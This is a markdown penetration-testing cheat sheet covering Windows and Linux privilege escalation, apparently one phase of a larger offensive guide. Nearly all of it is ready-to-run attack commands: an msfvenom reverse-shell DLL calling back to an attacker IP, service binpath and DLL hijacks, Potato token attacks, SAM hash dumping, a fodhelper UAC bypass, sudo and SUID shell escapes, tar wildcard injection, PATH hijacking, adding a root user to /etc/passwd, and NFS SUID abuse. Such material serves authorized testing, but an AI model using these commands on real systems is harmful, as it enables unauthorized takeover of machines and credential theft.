# ⬆️ Phase 3: Privilege Escalation

```
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

**Goal:** Elevate privileges from standard user to Administrator/SYSTEM (Windows) or root (Linux).

> 📚 **Full Guides:** [Windows PrivEsc](../Windows-PrivEsc/README.md) | [Linux PrivEsc](../Linux-PrivEsc/README.md)

---

## 🖥️ Windows Privilege Escalation

### Quick Wins - Check First
```cmd
# Check current privileges
whoami /priv
whoami /groups

# Check for stored credentials
cmdkey /list

# Unattended install files
dir /s C:\*unattend.xml C:\*sysprep.inf C:\*sysprep.xml 2>nul

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Service Exploits

#### Unquoted Service Path
```cmd
# Find unquoted paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# If found: C:\Program Files\Some Service\service.exe
# Place malicious exe at: C:\Program.exe or C:\Program Files\Some.exe
```

#### Weak Service Permissions
```cmd
# Check service permissions with accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# If SERVICE_CHANGE_CONFIG:
sc config VulnService binpath="C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

#### DLL Hijacking
```powershell
# Find services with missing DLLs (use Process Monitor)
# Place malicious DLL in service directory
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Token Impersonation

#### SeImpersonatePrivilege (Potato Attacks)
```cmd
# Check if you have SeImpersonatePrivilege
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 2012-2022)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# JuicyPotato (Windows 7/Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t * -c {CLSID}
```

#### SeBackupPrivilege
```powershell
# Backup SAM and SYSTEM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Extract hashes on attacker machine
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Registry Exploits
```cmd
# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Scheduled tasks writable paths
schtasks /query /fo LIST /v | findstr /i "Task To Run"

# Registry permissions
accesschk.exe -kvw hklm\SOFTWARE
```

### UAC Bypass
```powershell
# Fodhelper bypass (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

### Automated Tools
```bash
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows-Exploit-Suggester
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024.xlsx
```

---

## 🐧 Linux Privilege Escalation

### Quick Wins - Check First
```bash
# Sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd

# Kernel version for exploits
uname -a
```

### Sudo Exploits

#### Sudo without password
```bash
# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!sh'

# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/python
sudo python -c 'import os; os.system("/bin/sh")'
```

#### Sudo version exploit (CVE-2021-3156)
```bash
# Check sudo version
sudo --version

# If sudo < 1.9.5p2
# Use exploit: https://github.com/blasty/CVE-2021-3156
```

### SUID/SGID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check GTFOBins for exploitation
# https://gtfobins.github.io/

# Example: SUID on /usr/bin/find
/usr/bin/find . -exec /bin/sh -p \; -quit

# Example: SUID on /usr/bin/vim
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# Example: SUID on /usr/bin/python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Capabilities
```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Example: cap_setuid on python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cron Jobs
```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Look for writable scripts
# Wildcard injection in tar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /path/shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

### PATH Hijacking
```bash
# If a cron/script calls a binary without full path
# Create malicious binary in writable PATH directory

echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
```

### Writable /etc/passwd
```bash
# If /etc/passwd is writable
# Generate password hash
openssl passwd -1 -salt evil password123

# Add root user
echo 'evil:$1$evil$xyz...:0:0::/root:/bin/bash' >> /etc/passwd

# Switch to new root user
su evil
```

### Kernel Exploits
```bash
# Check kernel version
uname -r
cat /proc/version

# Search for exploits
searchsploit linux kernel 4.4 privilege escalation

# Popular kernel exploits:
# - DirtyCow (CVE-2016-5195) - Kernel 2.x - 4.x
# - DirtyPipe (CVE-2022-0847) - Kernel 5.8 - 5.16.11
```

### NFS Exploits
```bash
# Check for no_root_squash
showmount -e 192.168.1.10
cat /etc/exports

# If no_root_squash:
# Mount share, create SUID binary as root
mount -t nfs 192.168.1.10:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# On target:
/mnt/bash -p
```

### Automated Tools
```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux-exploit-suggester
./linux-exploit-suggester.sh

# Linux Smart Enumeration (LSE)
./lse.sh -l 2
```

---

## 📊 Quick Reference

### Windows Checklist
```markdown
- [ ] whoami /priv (SeImpersonate, SeBackup, etc.)
- [ ] Unquoted service paths
- [ ] Weak service permissions
- [ ] AlwaysInstallElevated
- [ ] Stored credentials (cmdkey /list)
- [ ] Unattend/Sysprep files
- [ ] Scheduled tasks
- [ ] Run WinPEAS/PowerUp
```

### Linux Checklist
```markdown
- [ ] sudo -l
- [ ] SUID binaries (check GTFOBins)
- [ ] Capabilities
- [ ] Cron jobs (writable scripts, wildcards)
- [ ] /etc/passwd writable
- [ ] Kernel version (exploits)
- [ ] NFS no_root_squash
- [ ] Run LinPEAS
```

---

## 🔗 Related Cheatsheets

- [Windows PrivEsc (Full)](../Windows-PrivEsc/README.md)
- [Linux PrivEsc (Full)](../Linux-PrivEsc/README.md)
- [Mimikatz](../Mimikatz/README.md)

---

**Previous Phase:** [← 02 - Enumeration](./02-Enumeration.md)

**Next Phase:** [04 - Lateral Movement →](./04-Lateral-Movement.md)
